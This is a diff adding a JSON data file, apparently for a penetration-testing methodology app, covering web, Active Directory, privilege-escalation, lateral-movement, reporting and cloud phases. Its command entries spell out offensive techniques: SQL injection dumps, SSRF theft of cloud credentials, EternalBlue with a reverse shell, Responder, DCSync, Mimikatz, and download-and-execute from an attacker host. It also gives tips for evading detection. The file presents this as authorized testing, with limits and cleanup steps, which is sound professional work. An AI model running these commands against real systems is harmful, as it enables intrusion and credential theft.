+          "SQLi \u2014 DB structure + max 5 sample rows",
+          "Auth bypass \u2014 gain unauthorized access",
+          "XSS \u2014 alert(document.domain) only, never cookie theft",
+          "IDOR \u2014 access another user's resource",
+          "SSRF \u2014 reach cloud metadata or internal service",
+          "JWT \u2014 algorithm confusion or weak secret cracking",
+          "Business logic \u2014 price/access/workflow flaws"
+        ],
+        "commands": [
+          {
+            "id": "e1c1",
+            "title": "SQLMap Full Exploitation",
+            "purpose": "Prove SQL injection with controlled data extraction",
+            "cmd": "# Most reliable \u2014 from Burp saved request:\nsqlmap -r burp_request.txt --dbs --batch\n\n# Direct URL:\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\n\n# Dump table (5 rows max):\nsqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch\n\n# SSRF test payloads:\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/'\ncurl '{URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\ncurl '{URL}?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'",
+            "example": "sqlmap -r burp_login.txt --dbs --batch\ncurl 'https://acmecorp.com/fetch?url=http://169.254.169.254/latest/meta-data/'",
+            "flags": [
+              {
+                "f": "--stop 5",
+                "d": "CRITICAL: 5 rows max \u2014 never dump full PII"
+              },
+              {
+                "f": "-r",
+                "d": "Burp request file \u2014 most reliable"
+              },
+              {
+                "f": "--dbs",
+                "d": "List all databases"
+              }
+            ],
+            "note": "AWS IAM creds at /iam/security-credentials/{role} = usable worldwide. Screenshot = instant critical finding.",
+            "out": "DB structure + sample rows (SQLi) | Cloud IAM creds (SSRF) | Unauthorized data (IDOR)"
+          },
+          {
+            "id": "e1c2",
+            "title": "XSS + Auth Bypass + JWT",
+            "purpose": "JavaScript execution, authentication bypass, JWT token exploitation",
+            "cmd": "# XSS automated scan:\nxsstrike -u '{URL}?q=FUZZ' --crawl\n\n# Manual XSS payloads:\n# <script>alert(document.domain)</script>\n# \"><img src=x onerror=alert(document.domain)>\n# <svg onload=alert(1)>\n\n# Auth bypass in Burp Repeater:\n# {\"role\":\"user\"} -> {\"role\":\"admin\"}\n# {\"isAdmin\":false} -> {\"isAdmin\":true}\n# GET /api/users/1234 -> /api/users/1235 (IDOR)\n\n# JWT attacks:\npython3 jwt_tool.py {TOKEN} -X a\nhashcat -m 16500 {TOKEN} /usr/share/wordlists/rockyou.txt --force",
+            "example": "xsstrike -u 'https://acmecorp.com/search?q=FUZZ' --crawl\npython3 jwt_tool.py eyJhbGc... -X a",
+            "flags": [
+              {
+                "f": "--crawl",
+                "d": "Test all discovered inputs"
+              },
+              {
+                "f": "-X a",
+                "d": "jwt_tool: alg:none attack"
+              },
+              {
+                "f": "-m 16500",
+                "d": "hashcat: JWT HS256 crack"
+              }
+            ],
+            "note": "XSS: alert(document.domain) proves JS execution without stealing real user cookies from a live session.",
+            "out": "JS executing in browser + admin access via auth bypass + JWT takeover"
+          }
+        ],
+        "tools": [
+          "sqlmap",
+          "Burp Suite Pro",
+          "xsstrike",
+          "jwt_tool",
+          "curl"
+        ],
+        "deliverable": "Exploitation evidence per finding: request + response + business impact + screenshot",
+        "tip": "Prove impact, cause zero harm. 5 DB rows not 5000. alert(1) not cookie theft. The capability screenshot is everything."
+      },
+      {
+        "id": "e2",
+        "title": "Network + AD Exploitation",
+        "priority": "high",
+        "summary": "Credential attacks, CVE exploitation, and full Active Directory attack chain.",
+        "checklist": [
+          "Default/weak credentials on ALL services (SSH, FTP, RDP, databases)",
+          "Metasploit CVE exploitation (verify before exploiting)",
+          "Password spraying (check lockout policy first)",
+          "Responder \u2014 LLMNR/NBT-NS poisoning",
+          "Kerberoasting + hash cracking",
+          "DCSync \u2014 dump all domain hashes"
+        ],
+        "commands": [
+          {
+            "id": "e2c1",
+            "title": "Hydra + CrackMapExec Spraying",
+            "purpose": "Credential attacks across network services and AD",
+            "cmd": "# SSH brute force:\nhydra -l {USER} -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://{TARGET} -t 4\n\n# HTTP form:\nhydra -L users.txt -P passwords.txt {TARGET} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 4\n\n# Password spray (one password, many users \u2014 avoids lockout):\ncrackmapexec smb {RANGE} -u ad_users.txt -p 'Password1!' --continue-on-success\n\n# Pass-the-Hash:\ncrackmapexec smb {RANGE} -u Administrator -H {NTLM_HASH} --continue-on-success",
+            "example": "hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt ssh://192.168.1.100 -t 4\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome123!' --continue-on-success",
+            "flags": [
+              {
+                "f": "-t 4",
+                "d": "4 threads \u2014 keep low to avoid lockouts"
+              },
+              {
+                "f": "--continue-on-success",
+                "d": "CME: find all valid creds"
+              },
+              {
+                "f": "-H",
+                "d": "NTLM hash for Pass-the-Hash"
+              }
+            ],
+            "note": "Check password lockout policy BEFORE spraying. One password per observation window is the safe limit.",
+            "out": "Valid credentials | (Pwn3d!) = local admin"
+          },
+          {
+            "id": "e2c2",
+            "title": "Metasploit + Responder + DCSync",
+            "purpose": "CVE exploitation, NTLMv2 capture, and domain hash extraction",
+            "cmd": "# Metasploit workflow:\nmsfconsole -q\nmsf6 > use auxiliary/scanner/smb/smb_ms17_010\nmsf6 > set RHOSTS {TARGET} && run\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS {TARGET} && set LHOST {YOUR_IP}\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp && exploit\n\n# Meterpreter:\nmeterpreter > sysinfo && getuid && screenshot && hashdump\n\n# Responder:\nsudo responder -I eth0 -wvF\nhashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2*.txt /usr/share/wordlists/rockyou.txt --force\n\n# DCSync (requires Domain Admin):\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP}\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt",
+            "example": "sudo responder -I eth0 -wvF\nimpacket-secretsdump acme.local/administrator:'Password123'@192.168.1.10",
+            "flags": [
+              {
+                "f": "-wvF",
+                "d": "responder: WPAD + verbose + force NTLM"
+              },
+              {
+                "f": "-m 5600",
+                "d": "hashcat: NTLMv2 mode"
+              },
+              {
+                "f": "-just-dc-user",
+                "d": "secretsdump: extract only one account"
+              }
+            ],
+            "note": "krbtgt hash from DCSync = Golden Ticket capability. Screenshot immediately \u2014 this is the crown jewel finding.",
+            "out": "Meterpreter shell + cracked NTLMv2 (Responder) + all domain hashes (DCSync)"
+          }
+        ],
+        "tools": [
+          "Hydra",
+          "CrackMapExec",
+          "Metasploit",
+          "Responder",
+          "Impacket",
+          "hashcat"
+        ],
+        "deliverable": "Exploitation log: timestamps, commands, systems accessed, credentials found",
+        "tip": "Document as you go, not from memory later. Keep CherryTree open and paste commands + output in real time."
+      }
+    ]
+  },
+  {
+    "id": "postex",
+    "label": "Post-Exploitation",
+    "short": "Post-Ex",
+    "icon": "\ud83c\udff4",
+    "color": "#f59e0b",
+    "desc": "Privilege escalation, credential dumping, lateral movement, cleanup",
+    "steps": [
+      {
+        "id": "pe1",
+        "title": "Linux Privilege Escalation",
+        "priority": "critical",
+        "summary": "Escalate from low-privilege shell to root using automated scans and manual techniques.",
+        "checklist": [
+          "Run LinPEAS automated scan",
+          "Check sudo -l for exploitable binaries (GTFOBins)",
+          "Hunt SUID/SGID binaries",
+          "Check writable cron jobs",
+          "Check Linux capabilities (getcap -r /)",
+          "Search credentials in configs and shell history"
+        ],
+        "commands": [
+          {
+            "id": "pe1c1",
+            "title": "LinPEAS + sudo -l + SUID Hunt",
+            "purpose": "Automated and manual Linux privilege escalation",
+            "cmd": "# LinPEAS (no file on disk):\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Or download + save output:\npython3 -m http.server 8000  # on attacker\nwget http://{YOUR_IP}:8000/linpeas.sh -O /tmp/.lp && chmod +x /tmp/.lp\n/tmp/.lp | tee /tmp/.out.txt\n\n# sudo -l + GTFOBins exploits:\nsudo -l\nsudo vim -c ':!bash'\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\nsudo find / -exec /bin/bash \\; -quit\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# SUID binary hunt:\nfind / -perm -u=s -type f 2>/dev/null\n# Check EACH at: gtfobins.github.io -> SUID section",
+            "example": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\nsudo -l  # then check gtfobins.github.io for each binary found",
+            "flags": [
+              {
+                "f": "-perm -u=s",
+                "d": "SUID bit set \u2014 runs as file owner"
+              },
+              {
+                "f": "2>/dev/null",
+                "d": "Suppress permission denied errors"
+              }
+            ],
+            "note": "LinPEAS color code: Bright Red/Yellow = HIGH probability. Focus there. Check every sudo binary at gtfobins.github.io.",
+            "out": "Color-coded PrivEsc vectors + root shell via sudo/SUID exploitation"
+          },
+          {
+            "id": "pe1c2",
+            "title": "Credential Hunting on Linux",
+            "purpose": "Find cleartext passwords in configs, history, environment",
+            "cmd": "# Search config files:\ngrep -ria 'password\\|passwd\\|secret\\|api_key\\|db_pass' /var/www/ /opt/ /home/ /etc/ 2>/dev/null | grep -v '.pyc'\n\n# Shell history:\ncat ~/.bash_history ~/.zsh_history 2>/dev/null\n\n# Environment variables:\nenv | grep -iE 'pass|secret|key|token|api'\n\n# Common config files:\nfind / -name '.env' -o -name 'wp-config.php' -o -name 'database.yml' 2>/dev/null | xargs grep -l 'password' 2>/dev/null",
+            "example": "grep -ria 'password' /var/www/ /opt/ /home/ 2>/dev/null | grep -v '.pyc'",
+            "flags": [
+              {
+                "f": "-r",
+                "d": "Recursive search"
+              },
+              {
+                "f": "-i",
+                "d": "Case insensitive"
+              },
+              {
+                "f": "-a",
+                "d": "Treat binaries as text"
+              }
+            ],
+            "note": "wp-config.php and .env files are goldmines. Always check the web document root and /opt/.",
+            "out": "Cleartext credentials in config files, history, and environment variables"
+          }
+        ],
+        "tools": [
+          "LinPEAS",
+          "pspy",
+          "GTFOBins",
+          "find",
+          "grep"
+        ],
+        "deliverable": "PrivEsc chain: low-priv to root with each step documented and screenshot",
+        "tip": "LinPEAS colors are everything. Bright red = test first. One sudo rule or SUID binary is all you need to get root."
+      },
+      {
+        "id": "pe2",
+        "title": "Windows Privilege Escalation",
+        "priority": "critical",
+        "summary": "Escalate from low-privilege user to SYSTEM on Windows.",
+        "checklist": [
+          "Run WinPEAS automated scan",
+          "Check whoami /priv (SeImpersonatePrivilege = instant SYSTEM)",
+          "Run PowerUp.ps1 Invoke-AllChecks",
+          "AlwaysInstallElevated registry check",
+          "Stored credentials: cmdkey /list",
+          "Unquoted service paths and weak service permissions"
+        ],
+        "commands": [
+          {
+            "id": "pe2c1",
+            "title": "WinPEAS + SeImpersonatePrivilege",
+            "purpose": "Automated scan and instant SYSTEM via token privilege abuse",
+            "cmd": "# Transfer and run WinPEAS:\npython3 -m http.server 8000  # on attacker\ncertutil -urlcache -f http://{YOUR_IP}:8000/winPEASx64.exe C:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe | Out-File C:\\Windows\\Temp\\wp.txt\n\n# Check token privileges:\nwhoami /priv\n\n# SeImpersonatePrivilege present? -> Instant SYSTEM:\nPrintSpoofer64.exe -i -c cmd\nGodPotato.exe -cmd 'cmd /c whoami'\n\n# PowerUp.ps1 automated checks:\npowershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{YOUR_IP}:8000/PowerUp.ps1'); Invoke-AllChecks\"",
+            "example": "certutil -urlcache -f http://192.168.1.50:8000/winPEASx64.exe wp.exe && wp.exe\nwhoami /priv  # look for SeImpersonatePrivilege",
+            "flags": [
+              {
+                "f": "-i",
+                "d": "PrintSpoofer: interact with spawned process"
+              },
+              {
+                "f": "-c cmd",
+                "d": "PrintSpoofer: command to run as SYSTEM"
+              },
+              {
+                "f": "-ep bypass",
+                "d": "PowerShell: bypass execution policy"
+              }
+            ],
+            "note": "SeImpersonatePrivilege is extremely common on IIS, SQL Server, and other service accounts. PrintSpoofer works 95% of the time.",
+            "out": "WinPEAS color-coded findings + instant SYSTEM shell via PrintSpoofer"
+          },
+          {
+            "id": "pe2c2",
+            "title": "Mimikatz + secretsdump",
+            "purpose": "Extract credentials from Windows memory and remote SAM/NTDS",
+            "cmd": "# Mimikatz (local):\nmimikatz.exe\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::sam\nmimikatz # lsadump::dcsync /user:krbtgt\n\n# Remote dump via Impacket (no file on target \u2014 stealthier):\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{TARGET_IP}\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt",
+            "example": "mimikatz # privilege::debug -> sekurlsa::logonpasswords\nimpacket-secretsdump acme.local/administrator:'Password123'@192.168.1.10",
+            "flags": [
+              {
+                "f": "privilege::debug",
+                "d": "Enable debug privileges (required)"
+              },
+              {
+                "f": "sekurlsa::logonpasswords",
+                "d": "Dump LSASS memory (may include plaintext)"
+              },
+              {
+                "f": "lsadump::sam",
+                "d": "Dump local SAM database"
+              },
+              {
+                "f": "-just-dc-user",
+                "d": "Extract only specified account hash"
+              }
+            ],
+            "note": "Defender catches mimikatz.exe. Use impacket-secretsdump remotely \u2014 no file on target, much stealthier.",
+            "out": "Plaintext passwords or NTLM hashes for all logged-on accounts"
+          }
+        ],
+        "tools": [
+          "WinPEAS",
+          "PowerUp.ps1",
+          "Mimikatz",
+          "PrintSpoofer",
+          "GodPotato",
+          "Impacket"
+        ],
+        "deliverable": "Windows PrivEsc chain: low-priv to SYSTEM with commands and screenshots",
+        "tip": "Always run whoami /priv first. SeImpersonatePrivilege + PrintSpoofer = SYSTEM in 10 seconds \u2014 most reliable Windows privesc."
+      },
+      {
+        "id": "pe3",
+        "title": "Lateral Movement + Cleanup",
+        "priority": "high",
+        "summary": "Move through the network and remove ALL testing artifacts before closing.",
+        "checklist": [
+          "Evil-WinRM for Windows remote shells",
+          "Impacket wmiexec/psexec for command execution",
+          "CrackMapExec Pass-the-Hash sweep",
+          "Chisel SOCKS proxy for network pivoting",
+          "Timestamped proof-of-access file on each system",
+          "Remove ALL uploaded tools and files",
+          "Delete ALL created test accounts",
+          "Encrypt and archive all evidence"
+        ],
+        "commands": [
+          {
+            "id": "pe3c1",
+            "title": "Evil-WinRM + Impacket + Chisel",
+            "purpose": "Remote shells, lateral movement, and network pivoting",
+            "cmd": "# Evil-WinRM (WinRM port 5985/5986):\nevil-winrm -i {TARGET_IP} -u {USER} -p '{PASS}'\nevil-winrm -i {TARGET_IP} -u {USER} -H {NTLM_HASH}\n\n# Impacket (quietest to noisiest):\nimpacket-wmiexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-smbexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-psexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-wmiexec {DOMAIN}/{USER}@{TARGET_IP} -hashes :{NTLM_HASH}\n\n# Chisel SOCKS pivot:\n./chisel server -p 9001 --reverse                          # attacker\n./chisel.exe client {YOUR_IP}:9001 R:socks                 # on pivot host\necho 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf\nproxychains nmap -sT -p 445,22,3389 {INTERNAL_IP}",
+            "example": "evil-winrm -i 192.168.1.100 -u administrator -p 'Password123'\nimpacket-wmiexec acme.local/admin:'Pass123'@192.168.1.100",
+            "flags": [
+              {
+                "f": "-H",
+                "d": "NTLM hash for Pass-the-Hash"
+              },
+              {
+                "f": "-hashes :NTLM",
+                "d": "Impacket PTH format"
+              },
+              {
+                "f": "--reverse",
+                "d": "chisel: allow reverse tunnels"
+              },
+              {
+                "f": "R:socks",
+                "d": "chisel: create reverse SOCKS5 proxy"
+              }
+            ],
+            "note": "Always start with wmiexec \u2014 fewest traces. psexec creates a Windows service and is caught by most EDR solutions.",
+            "out": "Interactive remote shell + SOCKS5 proxy at 127.0.0.1:1080"
+          },
+          {
+            "id": "pe3c2",
+            "title": "Proof of Access + Cleanup + Archive",
+            "purpose": "Create timestamped evidence and remove all testing artifacts",
+            "cmd": "# Proof of access (Linux):\necho -e \"PENTEST PROOF\\nClient: {CLIENT}\\nDate: $(date)\\nHost: $(hostname)\\nUser: $(whoami)\" > /tmp/PENTEST_PROOF.txt\ncat /tmp/PENTEST_PROOF.txt\n\n# Proof of access (Windows CMD):\necho PENTEST PROOF - {CLIENT} - %DATE% %TIME% > C:\\Users\\Public\\PENTEST_PROOF.txt\nhostname >> C:\\Users\\Public\\PENTEST_PROOF.txt && whoami >> C:\\Users\\Public\\PENTEST_PROOF.txt\n\n# Cleanup Linux:\nrm -f /tmp/.lp /tmp/.out.txt /tmp/chisel /tmp/PENTEST_PROOF*.txt\n\n# Cleanup Windows:\ndel /f /q C:\\Windows\\Temp\\*.exe C:\\Users\\Public\\PENTEST_PROOF.txt\n\n# Archive evidence:\ntar czf ~/pentests/{CLIENT}_evidence.tar.gz ~/pentests/{CLIENT}/\ngpg --symmetric --cipher-algo AES256 ~/pentests/{CLIENT}_evidence.tar.gz",
+            "example": "echo 'PENTEST PROOF - AcmeCorp' > /tmp/PENTEST_PROOF.txt && cat /tmp/PENTEST_PROOF.txt",
+            "flags": [
+              {
+                "f": "rm -f",
+                "d": "Force delete without prompts"
+              },
+              {
+                "f": "--cipher-algo AES256",
+                "d": "AES-256 archive encryption"
+              }
+            ],
+            "note": "Screenshot the proof file + whoami together. Notify client of file location for them to verify and delete.",
+            "out": "Timestamped proof file + clean systems + encrypted evidence archive"
+          }
+        ],
+        "tools": [
+          "Evil-WinRM",
+          "Impacket",
+          "Chisel",
+          "proxychains",
+          "CrackMapExec",
+          "gpg",
+          "tar"
+        ],
+        "deliverable": "Lateral movement map + cleanup verification + encrypted evidence archive",
+        "tip": "Draw the path: [Attacker] -> [Host A] -> [Host B] -> [DC]. A diagram communicates lateral movement instantly \u2014 text takes paragraphs."
+      }
+    ]
+  },
+  {
+    "id": "report",
+    "label": "Reporting",
+    "short": "Report",
+    "icon": "\ud83d\udcca",
+    "color": "#10b981",
+    "desc": "CVSS scoring, professional report writing, encrypted delivery",
+    "steps": [
+      {
+        "id": "rp1",
+        "title": "CVSS Scoring + Finding Structure",
+        "priority": "critical",
+        "summary": "Score every finding objectively. Identical structure for every finding, every time.",
+        "checklist": [
+          "CVSS v3.1 score for every finding",
+          "Risk category: Critical/High/Medium/Low/Info",
+          "Map to MITRE ATT&CK techniques",
+          "Map to compliance requirements",
+          "Business impact in business language",
+          "Prioritized remediation order"
+        ],
+        "commands": [
+          {
+            "id": "rp1c1",
+            "title": "CVSS v3.1 Reference",
+            "purpose": "Objective, consistent risk scoring for all findings",
+            "cmd": "# CVSS v3.1 Vector format:\nCVSS:3.1/AV:{AV}/AC:{AC}/PR:{PR}/UI:{UI}/S:{S}/C:{C}/I:{I}/A:{A}\n\n# Attack Vector (AV):    N=Network, A=Adjacent, L=Local, P=Physical\n# Attack Complexity (AC): L=Low, H=High\n# Privileges Required (PR): N=None, L=Low, H=High\n# User Interaction (UI): N=None, R=Required\n# Scope (S):             U=Unchanged, C=Changed\n# Confidentiality (C):   H=High, L=Low, N=None\n# Integrity (I):         H=High, L=Low, N=None\n# Availability (A):      H=High, L=Low, N=None\n\n# Example: Unauthenticated SQLi -> full DB access\n# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 CRITICAL\n\n# Calculator: nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+            "example": "Unauth SQLi -> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 9.1 CRITICAL",
+            "flags": [],
+            "note": "Score the raw vulnerability. WAF/compensating controls do not reduce CVSS base score \u2014 note them separately.",
+            "out": "Numerical score 0.0-10.0 with Critical/High/Medium/Low label"
+          },
+          {
+            "id": "rp1c2",
+            "title": "Report Structure + Encrypted Delivery",
+            "purpose": "Standard report structure and secure delivery procedure",
+            "cmd": "# REQUIRED SECTIONS:\n# 1. Cover Page (client logo, CONFIDENTIAL, version)\n# 2. Table of Contents\n# 3. Executive Summary (1-2 pages, non-technical)\n#    - Overall risk rating\n#    - Finding counts by severity\n#    - Top 3 risks in plain business language\n#    - 3 immediate action items\n# 4. Engagement Overview (scope, methodology, dates)\n# 5. Attack Narrative (story: zero to Domain Admin)\n# 6. Findings (Title, CVSS, CWE, ATT&CK, Evidence, Impact, Remediation)\n# 7. Remediation Roadmap (P1: 7 days, P2: 30 days, P3: 90 days)\n# 8. Positive Observations\n# 9. Appendix (raw tool output, command log)\n\n# Encrypt delivery:\nqpdf --encrypt {PASSWORD} {PASSWORD} 256 -- report.pdf report_enc.pdf\nzip -e --password '{PASSWORD}' delivery.zip report.pdf\n# Send: file via email, password via SMS/Signal (separate channel)",
+            "example": "qpdf --encrypt 'TempP@ss2025!' 'TempP@ss2025!' 256 -- acmecorp_report_v1.pdf acmecorp_report_enc.pdf",
+            "flags": [
+              {
+                "f": "256",
+                "d": "AES-256 PDF encryption"
+              },
+              {
+                "f": "-e",
+                "d": "ZIP file encryption"
+              }
+            ],
+            "note": "NEVER email an unencrypted report. Always separate channels for file and password.",
+            "out": "Professional report + encrypted PDF ready for delivery"
+          }
+        ],
+        "tools": [
+          "Sysreptor",
+          "PlexTrac",
+          "Dradis",
+          "qpdf",
+          "MS Word"
+        ],
+        "deliverable": "Encrypted final report + executive presentation deck",
+        "tip": "Business impact is everything. 'Unauthenticated RCE' means nothing to a CEO. 'An attacker can take full control of all servers in minutes with no credentials' does."
+      }
+    ]
+  },
+  {
+    "id": "retest",
+    "label": "Re-test",
+    "short": "Retest",
+    "icon": "\u2705",
+    "color": "#22c55e",
+    "desc": "Verify remediations, issue attestation, close engagement professionally",
+    "steps": [
+      {
+        "id": "rt1",
+        "title": "Remediation Verification + Closure",
+        "priority": "critical",
+        "summary": "Re-test every finding after remediation window. Incomplete patches are extremely common.",
+        "checklist": [
+          "Request remediation status (30-90 days post-report)",
+          "Re-test all Critical and High findings",
+          "Re-test Medium/Low that client claims fixed",
+          "Verify patches correctly applied (not just partial)",
+          "Document: Resolved/Partial/Not Resolved/Risk Accepted",
+          "Attestation letter on company letterhead",
+          "Delete ALL client credentials from your systems",
+          "Archive evidence securely",
+          "Propose retainer or annual re-test"
+        ],
+        "commands": [
+          {
+            "id": "rt1c1",
+            "title": "Re-test Core Vulnerabilities",
+            "purpose": "Verify that remediations actually fix the identified vulnerabilities",
+            "cmd": "# Re-test SQLi (should return 'not injectable'):\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\ncurl -s '{URL}?id=1 OR 1=1' | grep -ic 'error\\|sql\\|syntax'\n\n# Re-test brute force protection:\nfor i in $(seq 1 6); do curl -s -d 'user=admin&pass=wrongpass' {URL}/login | grep -c 'lock\\|too many'; done\n\n# Always test EXACT same attack that worked before\n# Document: [BEFORE screenshot] vs [AFTER screenshot] side-by-side",
+            "example": "sqlmap -u 'https://acmecorp.com/products?id=1' --dbs --batch -> 'not injectable' = fix confirmed",
+            "flags": [],
+            "note": "Show ORIGINAL vulnerable response and NEW fixed response side-by-side. The contrast IS the proof of remediation.",
+            "out": "'Not injectable' / 'Attack fails' confirming fix OR continued vulnerability"
+          },
+          {
+            "id": "rt1c2",
+            "title": "Attestation Letter + Credential Purge",
+            "purpose": "Formal compliance letter and secure credential removal from your systems",
+            "cmd": "# ATTESTATION LETTER FORMAT (on company letterhead):\n# To Whom It May Concern:\n# [YOUR COMPANY] performed a professional penetration test on behalf\n# of [CLIENT NAME] between [START DATE] and [END DATE].\n# Scope: [IP ranges, domains, network]\n# Methodology: PTES + OWASP Testing Guide\n# Testers: [Names, Certs: OSCP/CEH/GPEN]\n# Of [X] findings: [Y] resolved (verified [RETEST DATE])\n# [Z] accepted as risk by [EXEC NAME] on [DATE]\n# Signed: [Your Name, Certs, Title, Company]\n\n# Securely purge client credentials:\nshred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/credentials.txt\nshred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/*.txt\nhistory -c && history -w",
+            "example": "Issue on company letterhead. Required for PCI-DSS, SOC 2, cyber insurance renewals.",
+            "flags": [
+              {
+                "f": "-vzu",
+                "d": "shred: verbose, zero-fill, remove"
+              },
+              {
+                "f": "-n 3",
+                "d": "shred: overwrite 3 times before deletion"
+              }
+            ],
+            "note": "Clients need this for PCI-DSS QSA audits, SOC 2, cyber insurance, partner due diligence. Price it as a separate deliverable.",
+            "out": "Formal attestation letter + clean attack machine"
+          }
+        ],
+        "tools": [
+          "shred",
+          "gpg",
+          "qpdf"
+        ],
+        "deliverable": "Re-test report + attestation letter + signed closure",
+        "tip": "The closure meeting is a sales opportunity. Clients who watched you find and verify fixes are primed for retainer conversations. Come with a proposal."
+      }
+    ]
+  },
+  {
+    "id": "cloud",
+    "label": "Cloud Assessment",
+    "short": "Cloud",
+    "icon": "\u2601\ufe0f",
+    "color": "#0ea5e9",
+    "desc": "AWS, Azure, GCP misconfigurations, IAM privilege escalation, exposed storage",
+    "steps": [
+      {
+        "id": "cl1",
+        "title": "Cloud Asset Discovery",
+        "priority": "high",
+        "summary": "Identify cloud provider, exposed storage, and leaked credentials before touching the environment.",
+        "checklist": [
+          "Identify cloud provider from DNS/headers/certificates",
+          "Search for exposed S3/Blob/GCS buckets in OSINT",
+          "Check GitHub/GitLab for leaked cloud credentials",
+          "Enumerate cloud-hosted subdomains",
+          "Check Shodan for cloud metadata endpoints",
+          "Verify bucket enumeration findings via unauthenticated access",
+          "Document all discovered cloud assets"
+        ],
+        "commands": [
+          {
+            "id": "cl1c1",
+            "title": "S3 Bucket Discovery & Access Test",
+            "purpose": "Find exposed S3 buckets belonging to target org",
+            "cmd": "# Unauthenticated bucket access:\naws s3 ls s3://{COMPANY}-{SUFFIX} --no-sign-request\n\n# Common suffixes to try:\nfor suffix in backup backups dev prod data logs assets media files; do\n  aws s3 ls s3://{COMPANY}-$suffix --no-sign-request 2>/dev/null && echo \"FOUND: {COMPANY}-$suffix\"\ndone\n\n# Check bucket ACL (is it truly public?):\naws s3api get-bucket-acl --bucket {BUCKET_NAME} --no-sign-request\naws s3api get-bucket-policy --bucket {BUCKET_NAME} --no-sign-request",
+            "example": "aws s3 ls s3://acmecorp-backups --no-sign-request",
+            "flags": [
+              {
+                "f": "--no-sign-request",
+                "d": "Access as anonymous \u2014 tests public buckets"
+              },
+              {
+                "f": "get-bucket-acl",
+                "d": "Check read/write permissions"
+              },
+              {
+                "f": "get-bucket-policy",
+                "d": "Read S3 policy for AllUsers grants"
+              }
+            ],
+            "note": "Try: {company}, {company}-backup, {company}-prod, {company}-dev, {company}-data, {company}-logs, {company}-assets",
+            "out": "File listing = exposed. AccessDenied = bucket exists but private. NoSuchBucket = doesn't exist"
+          },
+          {
+            "id": "cl1c2",
+            "title": "Multi-Cloud Audit \u2014 ScoutSuite",
+            "purpose": "Full security posture scan across AWS/Azure/GCP",
+            "cmd": "# AWS:\nscout aws --report-dir ~/pentests/{CLIENT}/cloud/scout-aws/\n\n# Azure (with az cli):\nscout azure --cli --report-dir ~/pentests/{CLIENT}/cloud/scout-azure/\n\n# GCP:\nscout gcp --user-account --report-dir ~/pentests/{CLIENT}/cloud/scout-gcp/\n\n# Open report:\nxdg-open ~/pentests/{CLIENT}/cloud/scout-aws/scoutsuite-report/scoutsuite_results.html",
+            "example": "scout aws --report-dir ./scout-output/ --services s3,iam,ec2,rds",
+            "flags": [
+              {
+                "f": "--services",
+                "d": "Audit specific services only (faster)"
+              },
+              {
+                "f": "--report-dir",
+                "d": "Output directory for HTML report"
+              },
+              {
+                "f": "--max-workers 4",
+                "d": "Concurrent API calls"
+              }
+            ],
+            "note": "Requires valid cloud credentials. Run with read-only role if grey-box. Full scan takes 10-30 minutes.",
+            "out": "HTML report with 200+ security checks \u2014 IAM, storage, network, encryption, logging"
+          }
+        ],
+        "tools": [
+          "aws-cli",
+          "ScoutSuite",
+          "subfinder"
+        ],
+        "deliverable": "Cloud asset inventory + exposed resources list + credential leak findings",
+        "tip": "Always grep GitHub repos for the company name + 'AKIA' (AWS key prefix). Developers leak cloud keys constantly. One leaked key = full account access."
+      },
+      {
+        "id": "cl2",
+        "title": "IAM Enumeration & Privilege Escalation",
+        "priority": "critical",
+        "summary": "Map all IAM permissions and find escalation paths to admin.",
+        "checklist": [
+          "Get current identity: aws sts get-caller-identity",
+          "List all attached policies for current user/role",
+          "Check for iam:PassRole + lambda:CreateFunction combo",
+          "Check for iam:CreatePolicyVersion on managed policies",
+          "Check for iam:AttachUserPolicy on self",
+          "Check for EC2 instance profile with admin rights",
+          "Look for wildcard policies (*:*)",
+          "Run Pacu for automated privilege escalation",
+          "Check cross-account trust relationships"
+        ],
+        "commands": [
+          {
+            "id": "cl2c1",
+            "title": "IAM Permission Enumeration",
+            "purpose": "Map exactly what the current credentials can do",
